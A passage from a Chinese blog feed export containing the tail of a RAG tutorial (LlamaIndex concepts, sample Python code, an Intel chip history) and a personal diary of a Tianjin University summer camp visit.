之后，我们就理解了 RAG 中的一大核心要素。那么，我们将如何构建一个 RAG 系统？</p><p><img src="/2024/07/17/%E7%AC%AC%E4%BA%8C%E6%9C%9FAI%E5%A4%8F%E4%BB%A4%E8%90%A5%E4%BB%BB%E5%8A%A13%EF%BC%9A%E5%AE%9E%E7%8E%B0RAG%E5%BA%94%E7%94%A8/image_7_z55hJhli48.png"></p><h2 id="3-3-如何实现RAG"><a href="#3-3-如何实现RAG" class="headerlink" title="3.3 如何实现RAG"></a>3.3 如何实现RAG</h2><p>具体而言，RAG 有很多的实现方式，在这里我们使用最简单的实现方法，他遵循最传统的规则，包括<strong>索引创建</strong>（Indexing）、<strong>检索</strong>（Retrieval）和<strong>生成</strong>（Generation），总的来说包括以下三个关键步骤：</p><ol><li>语料库被划分成一个个分散的块（chunk），然后使用 embedding 模型构建向量索引，并存储到向量数据库。</li><li>RAG 根据 query（当前提问）与索引块（Indexed Chunk）的向量相似度识别并对块进行检索。</li><li>模型根据检索块（Retrieved Chunk）中获取的上下文信息生成答案。</li></ol><p>RAG也可以被简单的分成几大模块：</p><ol><li><strong>向量化模块</strong>：用来将文档片段向量化</li><li><strong>文档加载和切分的模块工具</strong>：用来加载文档并切分成文档片段。</li><li><strong>向量数据库模块</strong>：用于将向量化后的文档存储到数据库中.</li><li><strong>检索模块</strong>：根据 Query （问题）检索相关的文档片段。</li><li><strong>大模型模块</strong>：结合 Query 及检索出来的文档回答用户的问题。</li></ol><p>我们可以用一张图简单理解 RAG 系统做了哪些事情：</p><p><img src="/2024/07/17/%E7%AC%AC%E4%BA%8C%E6%9C%9FAI%E5%A4%8F%E4%BB%A4%E8%90%A5%E4%BB%BB%E5%8A%A13%EF%BC%9A%E5%AE%9E%E7%8E%B0RAG%E5%BA%94%E7%94%A8/image_8_MVgQSgh0MN.png"></p><p>由图可知，我们通过基于提问检索出的知识块，和提问一起拼接输入到大模型问答后，让大模型的回答更加接近我们的提问预期，可靠性大幅度增加。但这也并非 RAG 技术的终点，我们可以通过更多额外方式增强 RAG 的效果，譬如：</p><p><img src="/2024/07/17/%E7%AC%AC%E4%BA%8C%E6%9C%9FAI%E5%A4%8F%E4%BB%A4%E8%90%A5%E4%BB%BB%E5%8A%A13%EF%BC%9A%E5%AE%9E%E7%8E%B0RAG%E5%BA%94%E7%94%A8/image_9_OFXUGA1U5z.png"></p><p>以最简单的“重排技术”为例，我们可以通过检索后重新排布检索的结果，从而提高提高打算使用的检索块与提问的关联度，最终提高问答的生成质量。</p><p>在 RAG 架构下，引入<strong>重排步骤</strong>可以有效改进召回效果，提升 <code>LLM</code>（大语言模型）生成答案的质量。我们可以通过一张图简单理解这一过程：</p><p><img src="/2024/07/17/%E7%AC%AC%E4%BA%8C%E6%9C%9FAI%E5%A4%8F%E4%BB%A4%E8%90%A5%E4%BB%BB%E5%8A%A13%EF%BC%9A%E5%AE%9E%E7%8E%B0RAG%E5%BA%94%E7%94%A8/image_10_mAvwyPFxNZ.png"></p><p>总之，我们可以利用 RAG 技术提高大模型问答最后的生成水平，在强事实要求与上下文不足的情况下仅仅依靠 RAG 就能实现满足预期的效果。接下来，让我们从初级 RAG 开始，一步步探索检索增强生成的应用之路。</p><hr><h1 id="4-llamaIndex"><a href="#4-llamaIndex" class="headerlink" title="4 llamaIndex"></a>4 llamaIndex</h1><h2 id="4-1-什么是-LlamaIndex"><a href="#4-1-什么是-LlamaIndex" class="headerlink" title="4.1 什么是 LlamaIndex"></a>4.1 什么是 LlamaIndex</h2><p><img src="/2024/07/17/%E7%AC%AC%E4%BA%8C%E6%9C%9FAI%E5%A4%8F%E4%BB%A4%E8%90%A5%E4%BB%BB%E5%8A%A13%EF%BC%9A%E5%AE%9E%E7%8E%B0RAG%E5%BA%94%E7%94%A8/image_11_HGqg8e62GN.png"></p><p>我们将使用<a href="https://docs.llamaindex.ai/en/stable/" title=" LlamaIndex "> LlamaIndex </a>进行初级 RAG 系统的搭建演示。<code>LlamaIndex</code> 是一个AI框架，用于简化将私有数据与公共数据集成到大型语言模型（<code>LLM</code>）中的应用程序中。它提供了数据 ingestion、 indexing 和查询的工具，使其成为生成式 AI 需求的可靠解决方案。</p><p><code>LlamaIndex</code> 主要包括以下几个组件：</p><ol><li><strong>数据连接器</strong>：帮助连接现有数据源和数据格式（如 API、PDF 等），并将这些数据转换为 <code>LlamaIndex</code> 可用的格式。</li><li><strong>数据索引</strong>：帮助结构化数据以适应不同的用例。加载了来自不同数据源的数据后，如何将它们分割、定义关系和组织，以便无论您想要解决的问题（问答、摘要等），都可以使用索引来检索相关信息。</li><li><strong>查询接口</strong>：是输入查询并从 <code>LLM</code> 中获取知识增强输出的接口。</li></ol><p>其中，<code>LlamaIndex</code> 有几个重要的高层次抽象结构需要我们理解：</p><h2 id="4-2-Indexing"><a href="#4-2-Indexing" class="headerlink" title="4.2 Indexing"></a>4.2 Indexing</h2><p>Indexing 是一种数据结构，它允许我们快速检索我们所查询的相关上下文，你可以把它简单理解为一种对“node”的抽象组织方式，在 <code>llamaindex</code> 中存在多种不同的组织 node 的方式。Indexing 将数据存储在 Node 对象（代表原始文档的 chunk ）中 ，并公开支持额外配置和自动化的 Retriever 接口。当我们看到 Node 对象的时候，你可以把他简单理解为 chunk。对于 <code>LlamaIndex</code>，它是检索增强生成（RAG）用例的核心基础。</p><ul><li>Keyword Table Index</li></ul><p><img src="/2024/07/17/%E7%AC%AC%E4%BA%8C%E6%9C%9FAI%E5%A4%8F%E4%BB%A4%E8%90%A5%E4%BB%BB%E5%8A%A13%EF%BC%9A%E5%AE%9E%E7%8E%B0RAG%E5%BA%94%E7%94%A8/image_12_9SoRTXIpG4.png"></p><ul><li>Tree Index</li></ul><p><img src="/2024/07/17/%E7%AC%AC%E4%BA%8C%E6%9C%9FAI%E5%A4%8F%E4%BB%A4%E8%90%A5%E4%BB%BB%E5%8A%A13%EF%BC%9A%E5%AE%9E%E7%8E%B0RAG%E5%BA%94%E7%94%A8/image_13_eksFaKiAXI.png"></p><ul><li>Vector Store Index</li></ul><p><img src="/2024/07/17/%E7%AC%AC%E4%BA%8C%E6%9C%9FAI%E5%A4%8F%E4%BB%A4%E8%90%A5%E4%BB%BB%E5%8A%A13%EF%BC%9A%E5%AE%9E%E7%8E%B0RAG%E5%BA%94%E7%94%A8/image_14_PRrogewT_V.png"></p><p>在高层次上，Indexing 是从 Documents 构建的 node 组成的。它们用于构建 Query Engine 等，可以通过您的数据进行问答和聊天。</p><p><img src="/2024/07/17/%E7%AC%AC%E4%BA%8C%E6%9C%9FAI%E5%A4%8F%E4%BB%A4%E8%90%A5%E4%BB%BB%E5%8A%A13%EF%BC%9A%E5%AE%9E%E7%8E%B0RAG%E5%BA%94%E7%94%A8/image_15_C12RqP_4IY.png"></p><h2 id="4-3-Vector-Stores"><a href="#4-3-Vector-Stores" class="headerlink" title="4.3 Vector Stores"></a>4.3 Vector Stores</h2><p>Vector Stores 负责收纳 chunks 的嵌入向量。默认情况下，<code>LlamaIndex</code> 使用一个简单的内存向量存储，非常适合快速实验。它们可以通过调用 <code>vector_store.persist()</code> 进行持久化。</p><p>你也可以更换不同的向量数据库进行实验，<code>LlamaIndex</code> 支持多种向量数据库输入。</p><p><img src="/2024/07/17/%E7%AC%AC%E4%BA%8C%E6%9C%9FAI%E5%A4%8F%E4%BB%A4%E8%90%A5%E4%BB%BB%E5%8A%A13%EF%BC%9A%E5%AE%9E%E7%8E%B0RAG%E5%BA%94%E7%94%A8/image_16_zz6_MXmprD.png"></p><h2 id="4-4-Query-Engine"><a href="#4-4-Query-Engine" class="headerlink" title="4.4 Query Engine"></a>4.4 Query Engine</h2><p>Query Engine 是 <code>LlamaIndex</code> 中的另一个重要的高级抽象基础设施。Query Engine 是一个通用接口，允许您对数据提出问题。Query Engine 引擎接收自然语言查询，它通常（但不总是）通过检索器建立在一个或多个 indexing 上。您可以组合多个 Query Engine 来实现更高级的功能。</p><p>简单而言，我们可以通过以下方式快速基于某个 index 数据结构构建一个查询引擎，并对他进行查询。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">query_engine = index.as_query_engine()</span><br><span class="line">response = query_engine.query(<span class="string">&quot;Who is Paul Graham.&quot;</span>)</span><br><span class="line"><span class="comment"># 流式调用</span></span><br><span class="line">query_engine = index.as_query_engine(streaming=<span class="literal">True</span>)</span><br><span class="line">streaming_response = query_engine.query(<span class="string">&quot;Who is Paul Graham.&quot;</span>)</span><br><span class="line">streaming_response.print_response_stream()</span><br></pre></td></tr></table></figure><p>通过 index 、vector store、 query engine 的构建，我们可以很容易针对不同抽象组织的 chunk 进行我们想要的检索、查询操作，最终得到高质量的 RAG 系统。</p><p>看了那么多有关 <code>LlamaIndex</code> 的介绍，我们还是不能学会如何结合它与 <code>IPEX-LLM</code> 实现一个简单的 RAG 系统，所以，让我们直接进入到代码的阅读环节。</p><p>我们可以来看一个简单的 <code>LlamaIndex</code> 示例，它直观展示了如何构建一个 RAG 体系：</p><p>假设你有如下的文件组织：</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">├── starter.py</span><br><span class="line">└── data</span><br><span class="line">    └── paul_graham_essay.txt</span><br></pre></td></tr></table></figure><p>核心代码为：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 导入需要的模块和类</span></span><br><span class="line"><span class="keyword">from</span> llama_index.core <span class="keyword">import</span> VectorStoreIndex，SimpleDirectoryReader，Settings</span><br><span class="line"><span class="keyword">from</span> llama_index.embeddings.huggingface <span class="keyword">import</span> HuggingFaceEmbedding</span><br><span class="line"><span class="keyword">from</span> llama_index.llms.ollama <span class="keyword">import</span> Ollama</span><br><span class="line"></span><br><span class="line"><span class="comment"># 1. 使用 SimpleDirectoryReader 加载数据</span></span><br><span class="line"><span class="comment"># SimpleDirectoryReader 是一个简单的目录读取器，能从指定目录中读取所有文件的数据</span></span><br><span class="line">documents = SimpleDirectoryReader(<span class="string">&quot;data&quot;</span>).load_data()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 2. 设置嵌入模型为 bge-base</span></span><br><span class="line"><span class="comment"># HuggingFaceEmbedding 是一个嵌入模型类，用于将文本转换为向量表示</span></span><br><span class="line"><span class="comment"># 这里我们使用的是 &quot;BAAI/bge-base-en-v1.5&quot; 模型</span></span><br><span class="line">Settings.embed_model = HuggingFaceEmbedding(model_name=<span class="string">&quot;BAAI/bge-base-en-v1.5&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 3. 使用 Ollama 快速接入大语言模型</span></span><br><span class="line"><span class="comment"># Ollama 是一个模型的快速调用框架</span></span><br><span class="line"><span class="comment"># 这里我们指定使用 &quot;llama3&quot; 模型，并设置请求超时时间为 360 秒</span></span><br><span class="line">Settings.llm = Ollama(model=<span class="string">&quot;llama3&quot;</span>，request_timeout=<span class="number">360.0</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 4. 创建一个向量存储索引</span></span><br><span class="line"><span class="comment"># VectorStoreIndex 是一个用于存储和查询向量的索引类</span></span><br><span class="line"><span class="comment"># from_documents 方法是从文档数据创建索引</span></span><br><span class="line">index = VectorStoreIndex.from_documents(documents)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 5. 将索引转换为查询引擎</span></span><br><span class="line"><span class="comment"># as_query_engine 方法将现有的向量存储索引转换为一个查询引擎</span></span><br><span class="line"><span class="comment"># 查询引擎是一个通用接口，允许您对数据提出问题。</span></span><br><span class="line">query_engine = index.as_query_engine()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 6. 使用查询引擎进行查询</span></span><br><span class="line"><span class="comment"># query 方法接受一个查询字符串，并返回一个响应对象</span></span><br><span class="line"><span class="comment"># 这里我们查询 &quot;作者小时候做了什么？&quot;</span></span><br><span class="line">response = query_engine.query(<span class="string">&quot;What did the author do growing up?&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 7. 打印查询结果</span></span><br><span class="line"><span class="comment"># 打印从查询引擎返回的响应</span></span><br><span class="line"><span class="built_in">print</span>(response)</span><br></pre></td></tr></table></figure><p>从代码中，我们可以很容易看到 RAG 系统构建过程。首先我们需要一个读取器，以便我们获取目标目录的对应数据，接着需要对这个数据进行 embedding 化即创建索引，把他转为可存储的向量表示。最后就可以用设定好的大模型，结合查询引擎进行检索增强生成的对话。</p><hr><h1 id="5-实现一个自己的-RAG"><a href="#5-实现一个自己的-RAG" class="headerlink" title="5 实现一个自己的 RAG"></a>5 实现一个自己的 RAG</h1><p>如果你觉得 <code>LlamaIndex</code> 的封装还不够称心如意，在这里我们还能够实现自己的 RAG 框架，借助于 <a href="https://github.com/datawhalechina/tiny-universe/tree/main/content/TinyRAG" title="tiny-universe">tiny-universe</a>，我们可以很容易实现一个属于自己的 RAG 框架。</p><p><img src="/2024/07/17/%E7%AC%AC%E4%BA%8C%E6%9C%9FAI%E5%A4%8F%E4%BB%A4%E8%90%A5%E4%BB%BB%E5%8A%A13%EF%BC%9A%E5%AE%9E%E7%8E%B0RAG%E5%BA%94%E7%94%A8/image_17_ZQZs9yvySB.png"></p><p>基于简单的结构，我们能够很容易实现属于自己的 Embedding 抽取、持久化、检索与对话。</p><hr><h1 id="6-思考题"><a href="#6-思考题" class="headerlink" title="6 思考题"></a>6 思考题</h1><h2 id="6-1-🤔-更多的模态"><a href="#6-1-🤔-更多的模态" class="headerlink" title="6.1 🤔 更多的模态"></a>6.1 🤔 更多的模态</h2><p>在前面，我们提到的都是语言检索增强生成的方法；但当我们重新审视检索增强这一名词，会发现他并没有指定检索的信息就是语言。</p><p>事实上，检索增强——对应的只是通过检索输入最近的向量编码，再利用向量编码提供大模型作为上下文基础信息。那么，我们是否能够检索更多不同模态的向量编码，让我们实现更多模态的 RAG 系统？</p><p>比如，我们是否能够实现一个简单的图文对话工具，不需要视觉大模型，而利用一个 图文字典 向量数据库，通过匹配输入图找到对应的向量数据库最接近的图像 embedding，然后返回该图对应的真实文本解释给大语言模型；此时我们实现的就是图像多模态的 RAG 系统。</p><p>也许我们可以做的更多？ 图像、音频、视频、蛋白质……任何可编码对象都是我们能够检索的，甚至跨不同模态进行检索。</p><p>在向量的世界中，他们一视同仁，只有远近之分。</p><h2 id="6-2-🍉-更可控的效果"><a href="#6-2-🍉-更可控的效果" class="headerlink" title="6.2 🍉 更可控的效果"></a>6.2 🍉 更可控的效果</h2><p>RAG 在当前的发展中，已经极大的提高了大模型问答的精确程度，但我们仍担忧返回错误答案。我们是否有什么方式可以进一步提高检索精度？&#x20;</p><ul><li>从知识库的组织让检索更精确</li><li>从大模型的能力提高让检索更精确</li><li>通过多模型检查结果实现自动化测试精度</li><li>通过更多传统语义匹配、混淆度检测方式让回答结果更加固定</li><li>通过调节参数（温度值等）让回复更可控</li></ul><p>RAG的效果已然不错，但我们还需要让他更进一步，这会让AI产品化的爆发临界线越来越近。</p><hr><h1 id="7-英特尔芯片的故事"><a href="#7-英特尔芯片的故事" class="headerlink" title="7 英特尔芯片的故事"></a>7 英特尔芯片的故事</h1><p>在 AI 时代，席卷而来的不仅仅是人工智能给人的替代压力，而是在大时代下人展现出那颗勇往直前、永远奔腾不息的心。</p><p>英特尔公司（Intel）推出的第一款微处理器，也是全球第一款微处理器；于1971年11月15日发布。</p><p><img src="/2024/07/17/%E7%AC%AC%E4%BA%8C%E6%9C%9FAI%E5%A4%8F%E4%BB%A4%E8%90%A5%E4%BB%BB%E5%8A%A13%EF%BC%9A%E5%AE%9E%E7%8E%B0RAG%E5%BA%94%E7%94%A8/image_18_eMD6icdAIP.png"></p><p>1978和1979年，Intel公司先后推出了8086和8088芯片，它们都是16位微处理器，内含29000个晶体管，时钟频率为4.77MHz，地址总线为20位，可使用1MB内存。内部数据总线是16位，外部数据总线8088是8位，8086是16位。1981年8088，芯片首次用于IBMPC机中，开创了全新的微机时代。</p><p><img src="/2024/07/17/%E7%AC%AC%E4%BA%8C%E6%9C%9FAI%E5%A4%8F%E4%BB%A4%E8%90%A5%E4%BB%BB%E5%8A%A13%EF%BC%9A%E5%AE%9E%E7%8E%B0RAG%E5%BA%94%E7%94%A8/image_19_PtDnyaYVbX.png"></p><p>Intel公司于1993年03月22 日，发布了P5架构的80586，其正式名称为PENTIUM (中文名：奔腾)。PENTIUM含有310万个晶体管，L1为16KB（8+8）时钟频率最初为60MHZ和66MHZ，Socket 4 ( 273 針腳 PGA 封裝)，电压5V，采用0.8um BiCMOS工艺制造。</p><p><img src="/2024/07/17/%E7%AC%AC%E4%BA%8C%E6%9C%9FAI%E5%A4%8F%E4%BB%A4%E8%90%A5%E4%BB%BB%E5%8A%A13%EF%BC%9A%E5%AE%9E%E7%8E%B0RAG%E5%BA%94%E7%94%A8/image_20_F8xtfKXr-O.png"></p><p>1997年，在奔腾（P54C）和P6的基础上又有了新的发展，一块奔腾（P54C），加上57条多媒体指令，就得到了多能奔腾（P55C），相对P54C，P55C在以下几方面做了改进：</p><p>1。支持称为<code>MMX</code>多媒体扩展的新指令集，有57条新指令，用于高效地处理图形、视频、音频数据<br>2。内部Cache从<code>16KB</code>增加到<code>32KB</code><br>3。优化了CPU的执行核心</p><p><img src="/2024/07/17/%E7%AC%AC%E4%BA%8C%E6%9C%9FAI%E5%A4%8F%E4%BB%A4%E8%90%A5%E4%BB%BB%E5%8A%A13%EF%BC%9A%E5%AE%9E%E7%8E%B0RAG%E5%BA%94%E7%94%A8/image_21_KYzfZlnE2s.png"></p><p>在奔腾开创了 CPU 的新时代后，新架构的 CPU 紧随其后不断涌现：</p><p><img src="/2024/07/17/%E7%AC%AC%E4%BA%8C%E6%9C%9FAI%E5%A4%8F%E4%BB%A4%E8%90%A5%E4%BB%BB%E5%8A%A13%EF%BC%9A%E5%AE%9E%E7%8E%B0RAG%E5%BA%94%E7%94%A8/image_22_NEpXQv9ILA.png"></p><p><img src="/2024/07/17/%E7%AC%AC%E4%BA%8C%E6%9C%9FAI%E5%A4%8F%E4%BB%A4%E8%90%A5%E4%BB%BB%E5%8A%A13%EF%BC%9A%E5%AE%9E%E7%8E%B0RAG%E5%BA%94%E7%94%A8/image_23_R8az843I-0.png"></p><p>时光来到2024年，小小的奔腾已然演化出繁荣多样的 Intel 芯片体系：</p><p><img src="/2024/07/17/%E7%AC%AC%E4%BA%8C%E6%9C%9FAI%E5%A4%8F%E4%BB%A4%E8%90%A5%E4%BB%BB%E5%8A%A13%EF%BC%9A%E5%AE%9E%E7%8E%B0RAG%E5%BA%94%E7%94%A8/image_24_SBljwsUfHn.png"></p><p>酷睿（Core）是英特尔公司推出的面向中高端消费者、工作站和发烧友的一系列CPU。酷睿替代了曾经是中高端的奔腾（PenTium），将奔腾移至入门级，并将赛扬（Celeron）处理器推向低端。当前常见的I3I5I5就是这个系列，I7还出过至尊版Intel Core i7 Extreme EdiTIon，还有I9处理器。</p><p>奔腾（Pen<a href="https://link.zhihu.com/?target=http://bbs.elecfans.com/zhuti_715_1.html" title="Ti">Ti</a>um）是英特尔公司的一个注册商标，作为其x86处理器品牌之一，于1993年推出。之前奔腾是英特尔的唯一的x86处理器产品线，后来随着其产品线的扩展衍生出低端的赛扬（Celeron）系列、供服务器以及工作站使用的至强（Xeon）系列。2006年英特尔推出酷睿（Core）系列处理器产品线，取代原奔腾处理器系列的市场定位。如今奔腾定位中端系列，介于赛扬和酷睿之间。</p><ul><li>赛扬（Celeron）是英特尔公司中央处理器的一个注册商标。赛扬处理器是Intel旗下经济型产品，于1998年推出。</li><li>至强（Xeon）是Intel的一个中央处理器品牌，主要供服务器及工作站使用，亦有超级计算机采用此处理器。Intel XeonE3-1230曾因高性价比而受到电脑DIYer的热捧，有“i5的价格，i7的性能”的美誉。</li><li>安腾（Itanium），是英特尔安腾架构（IA-64）的64位处理器。第一款安腾于2001年推出，该处理器的市场定位是在于企业服务器与高性能运算系统。</li><li>凌动（Atom）开发代号Silverthorne，是Intel的一个超低电压处理器系列。该处理器的市场定位是在于智能手机、平板电脑和低成本PC，上网本等。</li></ul><p>除此之外，英特尔还有许多 GPU 相关的产品线，我们同样也能够通过 IPEX-LLM 以及其他英特尔深度学习框架，将大语言模型高效地运行在我们的端侧设备上。</p><p><img src="/2024/07/17/%E7%AC%AC%E4%BA%8C%E6%9C%9FAI%E5%A4%8F%E4%BB%A4%E8%90%A5%E4%BB%BB%E5%8A%A13%EF%BC%9A%E5%AE%9E%E7%8E%B0RAG%E5%BA%94%E7%94%A8/image_25_3C_3kaFlDs.png"></p>]]></content>
      
      
      <categories>
          
          <category> 大模型 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 大模型 </tag>
            
            <tag> RAG </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>天津大学智算夏令营之旅</title>
      <link href="/2024/07/03/%E5%A4%A9%E6%B4%A5%E5%A4%A7%E5%AD%A6%E6%99%BA%E7%AE%97%E5%A4%8F%E4%BB%A4%E8%90%A5%E4%B9%8B%E6%97%85/"/>
      <url>/2024/07/03/%E5%A4%A9%E6%B4%A5%E5%A4%A7%E5%AD%A6%E6%99%BA%E7%AE%97%E5%A4%8F%E4%BB%A4%E8%90%A5%E4%B9%8B%E6%97%85/</url>
      
        <content type="html"><![CDATA[<h1 id="1-夏令营安排"><a href="#1-夏令营安排" class="headerlink" title="1 夏令营安排"></a>1 夏令营安排</h1><p><img src="/2024/07/03/%E5%A4%A9%E6%B4%A5%E5%A4%A7%E5%AD%A6%E6%99%BA%E7%AE%97%E5%A4%8F%E4%BB%A4%E8%90%A5%E4%B9%8B%E6%97%85/image_9XSaE57GHW.png"></p><hr><h1 id="2-7月1日"><a href="#2-7月1日" class="headerlink" title="2 7月1日"></a>2 7月1日</h1><p>第一天刚起床的时候发现下雨了，但是自己并没有带伞，而且当时酒店里也没有伞，问了酒店客服，他说也没有。然后早上就穿着一个外套就出去了，幸亏这个外套是防雨的，外套外面都湿了，但是短袖一点没湿。</p><p><img src="/2024/07/03/%E5%A4%A9%E6%B4%A5%E5%A4%A7%E5%AD%A6%E6%99%BA%E7%AE%97%E5%A4%8F%E4%BB%A4%E8%90%A5%E4%B9%8B%E6%97%85/IMG_20240701_075920_dmJQU7A_iq.jpg"></p><p>当时看到天津大学北洋园的第一印象是：这个学校好大啊，感觉比我本科的学校大了 10 多倍，而且这还只是一个校区。由于上午进行宣讲，而且还下着雨，就直接去教室了。</p><p>到了教室后，已经有很多的学生了，下面是当时拍的一个照片。</p><p><img src="/2024/07/03/%E5%A4%A9%E6%B4%A5%E5%A4%A7%E5%AD%A6%E6%99%BA%E7%AE%97%E5%A4%8F%E4%BB%A4%E8%90%A5%E4%B9%8B%E6%97%85/IMG_20240701_102951_wXLTO3IKIW.jpg"></p><p>当时进到天大的一个教学楼，就感觉这个教学楼建的真好，感觉好大啊，而且教室里面的基础设施也很好，教室也真的好大，感觉天大好有钱。</p><p>之后就是每个团队的宣讲，主要感觉团队也很多，而且每个团队都有自己的体系，很有纪律。</p><p>记得上午的宣讲一直持续了很长时间，好像都快到下午 1 点了，当时挺饿的，宣讲结束之后就马上去吃饭了。天大中只有一个餐厅可以支持微信扫码，所以只能去那一个餐厅。</p><p>在去餐厅的路上，看到了天大的图书馆，如下图，是真的大，哭死&#x2F;(ㄒoㄒ)&#x2F;~~</p><p><img src="/2024/07/03/%E5%A4%A9%E6%B4%A5%E5%A4%A7%E5%AD%A6%E6%99%BA%E7%AE%97%E5%A4%8F%E4%BB%A4%E8%90%A5%E4%B9%8B%E6%97%85/IMG_20240701_125548_W7s-D5f4Eq.jpg"></p><p><img src="/2024/07/03/%E5%A4%A9%E6%B4%A5%E5%A4%A7%E5%AD%A6%E6%99%BA%E7%AE%97%E5%A4%8F%E4%BB%A4%E8%90%A5%E4%B9%8B%E6%97%85/IMG_20240701_125350__76_kVN99Y.jpg"></p><p>到了餐厅，感觉它们餐厅真高级，直接扫桌子上的小程序进行点餐，也不用去前台点，但是感觉真贵呀，在我们学校 15r 的饭菜，这里感觉至少 20r，我吃了一个拌饭，还是很香的。</p><p>下午是机试，去 47 教，那里全部是机房，然后机房也是真的大，太羡慕了。之后就是去考试了，一共 5 道题，感觉难度和初筛差不多，5 道全部做出来了，并且很多代码都是一次写出来，没有怎么进行调试，所以自我感觉还是挺不错的。</p><hr><h1 id="3-7月2日"><a href="#3-7月2日" class="headerlink" title="3 7月2日"></a>3 7月2日</h1><p><img src="/2024/07/03/%E5%A4%A9%E6%B4%A5%E5%A4%A7%E5%AD%A6%E6%99%BA%E7%AE%97%E5%A4%8F%E4%BB%A4%E8%90%A5%E4%B9%8B%E6%97%85/wx_camera_1719809590030_GleJDTsCOQ.jpg"></p><p>2 号是进行面试，我被安排在上午那一组的倒数第 3 个，看其他人面试的时候，发现有好多人都有论文和竞赛，而且还有很多打 ACM 的，拿了很好的奖。</p><p>当时就感觉自己其实本科期间做的努力在保研学生中也不能算很多吧，我面试介绍完之后，不知道是不是因为老师比较累的缘故，没有问我任何比赛和论文中的任何问题，就问了我一些生活上和学业上的问题，所以感觉没有什么参考价值。</p><p>之后面完就走了，2 号还是下雨，当时回去的路上看到天大中竟然还有鸭子🦆，挺牛的。</p><p><img src="/2024/07/03/%E5%A4%A9%E6%B4%A5%E5%A4%A7%E5%AD%A6%E6%99%BA%E7%AE%97%E5%A4%8F%E4%BB%A4%E8%90%A5%E4%B9%8B%E6%97%85/IMG_20240702_125451_i4KreLE1Oy.jpg"></p><p>下午回酒店之后，学了一会习，但是之后就一直在玩，刷手机，刷完之后的那种虚度光阴的空虚感涌上心头，也是在那之后，感觉自己的精力很多就被这些娱乐软件给消耗了，人一天的精力本来就是有限，不应该花费在这些事情上，应该去实现自己的理想。</p><hr><h1 id="4-7月3日"><a href="#4-7月3日" class="headerlink" title="4 7月3日"></a>4 7月3日</h1><p>3 号早上来了个小插曲，早上我收拾完之后，准备坐公交车去学校，但是这时候肚子疼，想去厕所，但是附近又没有厕所。我当时还萌生了随便找个树林就地解决的想法，但是最后还是放弃了，感觉不太文明。</p><p>我就硬憋着回了酒店，就在我刚从公交站离开的时候，公交车来了，完美错过。解决之后就打了车去天大。</p><p>3 号天气还挺好的，终于没有下雨，今天是智算的每个团队进行宣讲，挺有意思的。</p><p><img src="/2024/07/03/%E5%A4%A9%E6%B4%A5%E5%A4%A7%E5%AD%A6%E6%99%BA%E7%AE%97%E5%A4%8F%E4%BB%A4%E8%90%A5%E4%B9%8B%E6%97%85/IMG_20240703_124014_ZktQ4hHEdi.jpg"></p><p>有很多个团队进行宣讲，这里就不一一列举了，其中也看到他们研究生的学习环境，整体上还是很好的，而且计算资源也很丰富，总之，感觉自己来天大也是一个很好的选择。</p><p><img src="/2024/07/03/%E5%A4%A9%E6%B4%A5%E5%A4%A7%E5%AD%A6%E6%99%BA%E7%AE%97%E5%A4%8F%E4%BB%A4%E8%90%A5%E4%B9%8B%E6%97%85/IMG_20240703_164226_Oo0Z9grlue.jpg"></p><p>在打车去机场的路上，和司机师傅交谈了很多，他说他加上老婆每个月差不多能赚 3w，但是这在天津远远不够，同时他说他也看开了，不用想着每天多挣很多钱，就尽自己最大的努力就好，只要能要这个家维持下去，别越过越穷就好。当时我就感觉这可能就是成年人的烦恼吧，如果我以后有了家庭，我肯定也会面临这些问题，但是我希望自己现在就要去努力。</p><p>既然最终要面对这些问题，那为什么不现在多做一些努力？让以后的自己舒服一点呢？</p><hr><h1 id="5-收获"><a href="#5-收获" class="headerlink" title="5 收获"></a>5 收获</h1><h2 id="5-1-人外有人，天外有天"><a href="#5-1-人外有人，天外有天" class="headerlink" title="5.1 人外有人，天外有天"></a>5.1 人外有人，天外有天</h2><p>不要总感觉自己很厉害什么什么之类的，其实比你厉害的人有很多，比你优秀的人有很多。所以你所做的努力其实还远远不够，而且一定要好好规划自己的职业生涯，大四我也不想着玩了，现在我也不想玩了，就想打拼出自己的事业。</p><p>可能我现在一无所有吧，但是我希望通过我自己的努力，我能够获得一些东西，包括物质的和精神的。</p><h2 id="5-2-致心一处"><a href="#5-2-致心一处" class="headerlink" title="5.2 致心一处"></a>5.2 致心一处</h2><p>多把精力花在能够对你有帮助的事情上，如果是坏习惯就请你改正，如果是好习惯就请你坚持。</p><p>在生活中遇到什么困难都不要退缩，因为那没有什么，这就是生活的意义，此外，享受现在这一切，庆幸的是你很早的就认识到了这些问题。</p><p>自己的生活是过给自己看的，不用在意其他任何人的眼光，好不容易活一辈子，若要事事都考虑别人是不是太难为情了，而且对自己好一点。</p><p>总之，这次天大智算夏令营之旅还是有特别特别多的收获，有一些感觉使用言语表达不出来的，总之，相信自己，脚踏实地的走下去。</p>]]></content>
      
      
      <categories>
          
          <category> 保研 </category>
          
      </categories>
      
      
